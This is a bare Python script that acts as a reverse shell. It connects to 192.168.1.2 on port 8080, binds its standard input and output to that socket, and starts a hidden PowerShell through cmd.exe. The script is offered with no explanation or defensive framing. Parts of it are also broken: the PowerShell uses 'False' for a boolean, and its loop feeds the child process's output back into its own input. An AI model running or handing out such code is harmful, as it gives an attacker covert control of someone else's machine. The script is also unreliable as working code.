import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.2', 8080))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Use Powershell as the shell
p = subprocess.call(["powershell.exe", "-Command", "$p=New-Object System.Diagnostics.Process; $p.StartInfo.FileName='cmd.exe';$p.StartInfo.Arguments='/c powershell -nop -wind hidden';$p.StartInfo.UseShellExecute = False;$p.Start();[System.IO.StreamReader]$s=$p.StandardOutput;[System.IO.StreamWriter]$inp=$p.StandardInput;while(!$p.HasExited){$out=$s.ReadLine();$inp.WriteLine($out);}$p.Close();"])
